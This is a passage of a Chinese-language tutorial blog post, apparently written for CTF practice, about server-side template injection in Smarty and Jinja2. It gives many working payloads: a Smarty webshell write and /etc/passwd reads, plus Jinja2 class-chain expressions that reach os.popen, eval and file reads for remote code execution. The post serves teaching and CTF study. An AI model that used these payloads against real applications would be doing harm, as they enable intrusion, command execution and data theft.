-<h4 id="通过self获取Smarty类再调用其静态方法"><a href="#通过self获取Smarty类再调用其静态方法" class="headerlink" title="通过self获取Smarty类再调用其静态方法"></a><strong>通过self获取Smarty类再调用其静态方法</strong></h4><p><strong>getStreamVariable:</strong></p>
-<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)//<span class="title">variable</span>其实就是文件路径</span>
-<span class="function"></span>&#123;
-        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;
-        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);<span class="comment">//从此处开始对文件进行读取</span>
-        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;
-            <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;
-                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;
-            &#125;
-            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);
-            <span class="keyword">return</span> <span class="variable">$_result</span>;
-        &#125;
-        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;
-        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;
-            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);
-        &#125; <span class="keyword">else</span> &#123;
-            <span class="keyword">return</span> <span class="literal">null</span>;
-        &#125;
-    &#125;
-<span class="comment">//可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法</span>
-smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　<span class="title function_ invoke__">getStreamVariable</span>() 这个方法可以获取传入变量的流
-例如：
-&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</code></pre>
-
-<p>payload形如：<code>&#123;self::getStreamVariable(“file:///etc/passwd”)&#125;</code> &#x2F;&#x2F;在v3.1.30退出历史舞台</p>
-<p><strong>writeFile：</strong></p>
-<p>这个不是很懂，直接引用这个大佬的博客吧</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250307213236244.png" alt="image-20250307213236244"></p>
-<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span>
-<span class="function">    </span>&#123;
-        <span class="variable">$_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>();
-        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);
-        <span class="variable">$_file_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_file_perms&#x27;</span>) ? <span class="variable">$smarty</span>-&gt;_file_perms : <span class="number">0644</span>;
-        <span class="variable">$_dir_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_dir_perms&#x27;</span>) ? (<span class="keyword">isset</span>(<span class="variable">$smarty</span>-&gt;_dir_perms) ? <span class="variable">$smarty</span>-&gt;_dir_perms : <span class="number">0777</span>)  : <span class="number">0771</span>;
-        <span class="keyword">if</span> (<span class="variable">$_file_perms</span> !== <span class="literal">null</span>) &#123;
-            <span class="variable">$old_umask</span> = <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);
-        &#125;
-
-        <span class="variable">$_dirpath</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_filepath</span>);
-        <span class="comment">// if subdirs, create dir structure</span>
-        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_dirpath</span>)) &#123;
-            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$_dirpath</span>, <span class="variable">$_dir_perms</span>, <span class="literal">true</span>);
-        &#125;
-
-        <span class="comment">// write to tmp file, then move to overt file lock race condition</span>
-        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));
-        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
-            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
-            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
-       &#125;</code></pre>
-
-<p>我们在往上面看，可以看到这个方法是在<code>class Smarty_Internal_Runtime_WriteFile</code>下的，</p>
-<p>我们注意看这段代码</p>
-<pre><code class="highlight php"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
-            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
-            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
-       &#125;</code></pre>
-
-<p>这段代码将文件内容写入临时文件，如果写入失败，则恢复先前的错误报告级别，并抛出异常。</p>
-<p>这里的具体解释我会在下面的CVE-2017-1000480具体讲到，先挖个坑，这里写入临时文件，在loadCompiledTemplate函数下，存在语句</p>
-<pre><code class="highlight php"><span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filepath));</code></pre>
-
-<p>就有了</p>
-<pre><code class="highlight php">&#123;<span class="title class_">Smarty_Internal_Write_File</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::<span class="title function_ invoke__">clearConfig</span>())&#125;</code></pre>
-
-<p>我们将<code>&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;</code>写入了临时php文件中</p>
-<p><code>self::clearConfig()</code> 是一个 Smarty 内部方法，用于清除模板引擎的配置选项。</p>
-<p><code>$SCRIPT_NAME</code> 是一个在 PHP 中预定义的变量，用于表示当前执行脚本的文件路径和名称。</p>
-<p>但是writeFile方法也有版本限制，所以我们首先要确定模板的版本，再决定对应的攻击方法。</p>
-<h4 id="标签"><a href="#标签" class="headerlink" title="标签:"></a>标签:</h4><p><strong>{$smarty.version}</strong></p>
-<p>获取smarty的版本信息</p>
-<p><strong>{literal}</strong></p>
-<p>此标签的利用方法仅仅是在php5.x的版本中才可以使用，因为在 PHP5 环境下存在一种 PHP 标签， <code>&lt;script&gt;language=&quot;php&quot;&gt;&lt;/script&gt;，</code>我们便可以利用这一标签进行任意的 PHP 代码执行。但是在php7的版本中<code>&#123;literal&#125;xxxx;&#123;/literal&#125;</code>标签中间的内容就会被原封不动的输出，并不会解析。</p>
-<p>作用：{literal} 可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析。</p>
-<p>所以我们就可以利用其的作用来进行xss攻击SSTI等漏洞利用。</p>
-<pre><code class="highlight php">&#123;literal&#125;&lt;script&gt;language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;;&#123;/literal&#125;</code></pre>
-
-<p><strong>{php}{&#x2F;php}</strong></p>
-<p>用于执行php代码</p>
-<pre><code class="highlight php">&#123;php&#125;<span class="title function_ invoke__">phpinfo</span>();&#123;/php&#125;</code></pre>
-
-<p>但是这个方法在Smarty3版本中已经被禁用了，不过多赘述了。</p>
-<p><strong>{if}{&#x2F;if}</strong></p>
-<pre><code class="highlight php">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;
-&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;
-<span class="comment">//Smarty的&#123;if&#125;条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：&#123;if is_array($array)&#125;&#123;/if&#125;*</span></code></pre>
-
-<h3 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h3><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>python常见的模板有：Jinja2，tornado</p>
-<p>贴一下框架的判断方法</p>
-<pre><code class="highlight plaintext">&#123;7*7&#125; -&gt;49 -&gt; smarty
-
-&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; 49 -&gt; twig
-
-&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; 7777777 -&gt; jinjia2</code></pre>
-
-<p><strong>模糊测试:</strong></p>
-<p><code>class bases mro subclasses getitem</code><br><code>globals import</code><br><code>url_for  config lipsum  request  &#39;&#39; &quot;&quot; [] ()</code><br><code>popen init builtins</code><br><code>. + _ 0-9 $ %</code></p>
-<p>在后续的攻击中，一般会有大量的过滤，这里需要搞一下类之间的继承关系，通过继承关系的不断调用来达到RCE的目的(这里参考了其他师傅的博客)</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/12b88699f2f17cdb66c96df653330b03.png" alt="img"></p>
-<p>可以看到我们创建了4个类，其中的B类继承了A类，C、D类继承了B类,如果我们在这创建一个C的对象c，那么我们就可以通过<code>__class__</code>魔术方法来找到它的当前类</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/32629cc50bef871c175ff2cb97ba6987.png" alt="img"></p>
-<p>可以看到它返回了一个当前的类为C，我们还可以通过<code>__base__</code>这个魔术方法来找到当前类的父类</p>
-<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2fbe9f85aa0cf607d5d5fcc88271531a.png" alt="img" style="zoom: 80%;">
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/8c05f226639630b4d4ad107563d1c0c3.png" alt="img" style="zoom:80%;"><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/7d5077f18454f36e57b3f115a9bd759d.png" alt="img" style="zoom:80%;"></p>
-<p>这样就可以一步步叠上去，找到上面所有父类</p>
-<p>C-&gt;B-&gt;A-&gt;Object</p>
-<p>当然，你也可以直接用<code>__mor__</code>魔术方法以数组形式返回所有父类</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/d5a6a4672f9a1ccbfd8243b789e792ad.png" alt="img"></p>
-<p>拿到object类后就可以用<code>__subclasses__()</code>得到当前类的所有子类</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/24edbadb9ad62466cff298486ae13f07.png" alt="img"></p>
-<p>跟前面的<code>__mro__</code>魔术方法一样是用数组表示的，可以用下标找到对应的类。接下来我们给这个类进行一些初始化方法<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/a1580dabda5d7e8c5650908f99c21b90.png" alt="img">初始化方法后可以通过<code>__globals__</code>魔术方法来返回当前类方法中的全局变量字典，可能有一点点抽象，我也不太懂具体是返回什么，但是大致就是返回当前类的全局变量<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/a57a84281c102d35a1952386499a3bd4.png" alt="img">可以发现很多全局变量都在里面，我们需要最后能够进行<code>rce</code>，因此应该找到能执行系统命令的方法，这里用<code>popen</code>函数来执行系统命令，在后面加上具体的函数名即可找到对应的函数<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1349cff6c89f458812eff436f68c7b41.png" alt="img"> 我们执行一下shell命令，这里执行一下<code>whoami</code>，这里一定要记得用.read()来读取一下，因为<code>popen</code>方法返回的是一个与子进程通信的对象，为了从该对象中获取子进程的输出，因此需要使用read()方法来读取子进程的输出】。<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/5c13d7c7df91b9d0be15f9e52b194454.png" alt="img">可以发现成功执行系统命令，这里我们就其实通过类的继承关系里大致讲完了SSTI的一个攻击的思路。</p>
-<p>接下来让我们进入正题</p>
-<h3 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h3><h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的</p>
-<p>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了  块</p>
-<p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p>
-<p>Jinja2 模板同样支持控制语句，像在 <code>&#123;%…%&#125; </code>块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子:</p>
-<p><code>&lt;ul&gt;     &#123;% for comment in comments %&#125;
-         <li>&#123;&#123;comment&#125;&#125;</li>
-    &#123;% endfor %&#125;&lt;ul&gt;</code></p>
-<p>另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值</p>
-<pre><code class="highlight html">Hello, &#123;&#123;name|capitalize&#125;&#125;</code></pre>
-
-<p>但是这只能在渲染前的模板中进行注入，如果模板已经渲染，就不存在模板注入了:</p>
-<pre><code class="highlight plaintext">from flask import Flask, request
-from jinja2 import Template
-
-app = Flask(__name__)
-
-@app.route(&quot;/&quot;)
-def index():
-    name = request.args.get(&#x27;name&#x27;, &#x27;guest&#x27;)
-
-    t = Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)
-    return t.render(n=name)
-
-if __name__ == &quot;__main__&quot;:
-    app.run()</code></pre>
-
-<p>编译运行，再次注入就会失败<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1344396-20200903151308616-823367288.png" alt="img"></p>
-<h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><pre><code class="highlight plaintext">__dict__　　 ：保存类实例或对象实例的属性变量键值对字典
-__class__　　：返回一个实例所属的类
-__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
-__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）
-__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组
-// __base__和__mro__都是用来寻找基类的
-__subclasses__　　：以列表返回类的子类
-__init__　　 ：类的初始化方法
-__globals__　　   ：对包含函数全局变量的字典的引用_
-_builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　
-这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　
-在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　
-1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　
-2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</code></pre>
-
-<p>一般我们会看到<code>&#39;&#39;.__class__;().__class__;[].__class__;&quot;&quot;.__class__;&#123;&#125;.__class__</code>几种方法起手，究竟是什么意思捏</p>
-<p>其实是通过最简单数据类型的类来获取元类(Object)</p>
-<p><strong>利用file对象读取文件(Python2)</strong></p>
-<pre><code class="highlight plaintext">for c in &#123;&#125;.__class__.__base__.__subclasses__():
-    if(c.__name__==&#x27;file&#x27;):
-        print(c)
-        print c(&#x27;joker.txt&#x27;).readlines()</code></pre>
-
-<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903153121082-520901024.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903153121082-520901024.png" alt="img"></a></p>
-<p>上述代码先通过<code>__class__</code>获取字典对象所属的类，再通过<code>__base__</code>（<code>__bases[0]__</code>）拿到基类，然后使用<code>__subclasses__()</code>获取子类列表，在子类列表中直接寻找可以利用的类</p>
-<p>为了方便理解，我直接把获取到的子类列表打印出来：</p>
-<pre><code class="highlight plaintext">for c in &#123;&#125;.__class__.__base__.__subclasses__():
-        print(c)</code></pre>
-
-<p> 打印结果如下（python2.7.5）：</p>
-<pre><code class="highlight plaintext">&lt;type &#x27;type&#x27;&gt;
-&lt;type &#x27;weakref&#x27;&gt;
-&lt;type &#x27;weakcallableproxy&#x27;&gt;
-&lt;type &#x27;weakproxy&#x27;&gt;
-&lt;type &#x27;int&#x27;&gt;
-&lt;type &#x27;basestring&#x27;&gt;
-&lt;type &#x27;bytearray&#x27;&gt;
-&lt;type &#x27;list&#x27;&gt;
-&lt;type &#x27;NoneType&#x27;&gt;
-&lt;type &#x27;NotImplementedType&#x27;&gt;
-&lt;type &#x27;traceback&#x27;&gt;
-&lt;type &#x27;super&#x27;&gt;
-&lt;type &#x27;xrange&#x27;&gt;
-&lt;type &#x27;dict&#x27;&gt;
-&lt;type &#x27;set&#x27;&gt;
-&lt;type &#x27;slice&#x27;&gt;
-&lt;type &#x27;staticmethod&#x27;&gt;
-&lt;type &#x27;complex&#x27;&gt;
-&lt;type &#x27;float&#x27;&gt;
-&lt;type &#x27;buffer&#x27;&gt;
-&lt;type &#x27;long&#x27;&gt;
-&lt;type &#x27;frozenset&#x27;&gt;
-&lt;type &#x27;property&#x27;&gt;
-&lt;type &#x27;memoryview&#x27;&gt;
-&lt;type &#x27;tuple&#x27;&gt;
-&lt;type &#x27;enumerate&#x27;&gt;
-&lt;type &#x27;reversed&#x27;&gt;
-&lt;type &#x27;code&#x27;&gt;
-&lt;type &#x27;frame&#x27;&gt;
-&lt;type &#x27;builtin_function_or_method&#x27;&gt;
-&lt;type &#x27;instancemethod&#x27;&gt;
-&lt;type &#x27;function&#x27;&gt;
-&lt;type &#x27;classobj&#x27;&gt;
-&lt;type &#x27;dictproxy&#x27;&gt;
-&lt;type &#x27;generator&#x27;&gt;
-&lt;type &#x27;getset_descriptor&#x27;&gt;
-&lt;type &#x27;wrapper_descriptor&#x27;&gt;
-&lt;type &#x27;instance&#x27;&gt;
-&lt;type &#x27;ellipsis&#x27;&gt;
-&lt;type &#x27;member_descriptor&#x27;&gt;
-&lt;type &#x27;file&#x27;&gt;
-...</code></pre>
-
-<p>使用dir来看一下file这个子类的内置方法：</p>
-<pre><code class="highlight plaintext">dir(().__class__.__bases__[0].__subclasses__()[40])</code></pre>
-
-<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162108171-343241811.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162108171-343241811.png" alt="img"></a></p>
-<p>将要读取的文件传进入并使用readlines()方法读取，就相当于：</p>
-<pre><code class="highlight plaintext">file(&#x27;joker.txt&#x27;).readlines()</code></pre>
-
-<p>可以在python交互终端中尝试输出：</p>
-<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185622152-2036123666.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185622152-2036123666.png" alt="img"></a></p>
-<p>再使用jinja2的语法封装成可解析的样子：</p>
-<pre><code class="highlight plaintext">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
-&#123;% if c.__name__==&#x27;file&#x27; %&#125;
-&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;
-&#123;% endif %&#125;
-&#123;% endfor %&#125;</code></pre>
-
-<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162635283-101719007.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162635283-101719007.png" alt="img"></a></p>
-<p>不过我这边一直没有读取成功，原因是：<strong>python3已经移除了file。所以利用file子类文件读取只能在python2中用。</strong></p>
-<p>docker容器默认使用python3版本</p>
-<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903163434739-57279547.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903163434739-57279547.png" alt="img"></a></p>
-<p><strong>用内置模块执行命令</strong></p>
-<p>呃呃，但是前提是知道在subclasses里面要找哪个模块执行，贴一下常会用到的内置os的模块吧,顺便贴一般出现的位置，但是还是推荐脚本搜索一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329135105718.png" alt="image-20250329135105718"></p>
-<p><code>图片内容来自[Buuctf[Flask\]SSTI 1-CSDN博客](https://blog.csdn.net/F1or_/article/details/120533765)</code></p>
-<pre><code class="highlight python">os._wrap_close //<span class="number">117</span>
-warnings.catch_warnings //<span class="number">59</span>
-socket._socketobject
-site._Printer //<span class="number">71</span>
-site.Quitte
-subprocess.Popen //<span class="number">258</span>
-
-文件读取内置函数：
-file //<span class="number">40</span></code></pre>
-
-<hr>
-<p>上面的实例中我们使用dir把内置的对象列举出来，其实可以用<code>__globals__</code>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有<code>os</code>这种可以直接传入命令，造成命令执行</p>
-<pre><code class="highlight plaintext">#coding:utf-8search = &#x27;os&#x27;   #也可以是其他你想利用的模块
-num = -1
-for i in ().__class__.__bases__[0].__subclasses__():
-    num += 1
-    try:
-        if search in i.__init__.__globals__.keys():
-            print(i, num)
-    except:
-        pass</code></pre>
-
-<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903164854386-1155449135.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903164854386-1155449135.png" alt="img"></a></p>
-<p>可以看到在元组68，73的位置找到了os方法，这样就可以构造命令执行payload:</p>
-<pre><code class="highlight plaintext">().__class__.__bases__[0].__subclasses__()[68].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)
-().__class__.__base__.__subclasses__()[73].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)
-().__class__.__mro__[1].__subclasses__()[68].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)
-().__class__.__mro__[1].__subclasses__()[73].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)</code></pre>
-
-<p>在python交互终端中尝试输出：</p>
-<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185803928-864364882.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185803928-864364882.png" alt="img"></a></p>
-<p><strong>不过同样，只能在python2版本使用</strong></p>
-<p>这时候就要推荐<code>__builtins__</code>：</p>
-<pre><code class="highlight plaintext">#coding:utf-8
-
-search = &#x27;__builtins__&#x27;
-num = -1
-for i in ().__class__.__bases__[0].__subclasses__():
-    num += 1
-    try:
-        print(i.__init__.__globals__.keys())
-        if search in i.__init__.__globals__.keys():
-            print(i, num)
-    except:
-        pass</code></pre>
-
-<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193619159-1700547757.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193619159-1700547757.png" alt="img"></a></p>
-<p>这时候我们的命令执行payload就出来了：<br>python3：</p>
-<pre><code class="highlight plaintext">().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</code></pre>
-
-<p>python2：</p>
-<pre><code class="highlight plaintext">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</code></pre>
-
-<p>在python交互终端中尝试输出：</p>
-<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193824030-649565108.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193824030-649565108.png" alt="img">   </a></p>
-<p>实际注入效果：</p>
-<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903194150593-332610088.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903194150593-332610088.png" alt="img"></a></p>
-<p>既然大概知道原理跟利用，我这里不再废话，直接给出大佬们各种绕过payload：</p>
-<h4 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h4><pre><code class="highlight jinja2">
-&#123;% ... %&#125; for Statements #用来声明变量，也可以用于条件语句和循环语句
- 
-&#123;&#123; ... &#125;&#125; for Expressions to print to the template output #将表达式打印到模板输出
- 
-&#123;# ... #&#125; for Comments not included in the template output #表示未包含在模板输出中的注释
- 
-#...# for Line Statements #有和&#123;%%&#125;相同的效果</code></pre>
-
-<h4 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a><strong>基础payload</strong></h4><pre><code class="highlight jinja2">常用入口：
-1) 基类当入口
-2)config #获取配置信息
-3)lipsum
-&#123;&#123; lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read() &#125;&#125;
-
-4)request
-&#123;&#123;request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;
-&#123;&#123;request.application.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;
-
-5)url_for
-&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
-
-6)get_flashed 
-&#123;&#123;get_flashed_messages.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
-
-
-调用命令:
-1)popen
-2)__builtins__ 调用方法</code></pre>
-
-
-
-<pre><code class="highlight plaintext">获得基类
-#python2.7
-&#x27;&#x27;.__class__.__mro__[2]
-&#123;&#125;.__class__.__bases__[0]
-().__class__.__bases__[0]
-[].__class__.__bases__[0]
-request.__class__.__mro__[1]
-#python3.7
-&#x27;&#x27;.__。。。class__.__mro__[1]
-&#123;&#125;.__class__.__bases__[0]
-().__class__.__bases__[0]
-[].__class__.__bases__[0]
-request.__class__.__mro__[1]
-
-#python 2.7
-#文件操作
-#找到file类
-[].__class__.__bases__[0].__subclasses__()[40]
-#读文件
-[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()
-#写文件
-[].__class__.__bases__[0].__subclasses__()[40](&#x27;/tmp&#x27;).write(&#x27;test&#x27;)
-
-#命令执行
-#os执行
-[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
-[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;id&#x27;).read()
-().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27; )
-
-#eval,impoer等全局函数
-[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
-[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)
-[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)
-[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()
-[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()
-  
-#python3.7
-#命令执行
-&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
-#文件操作
-&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
-#windows下的os命令
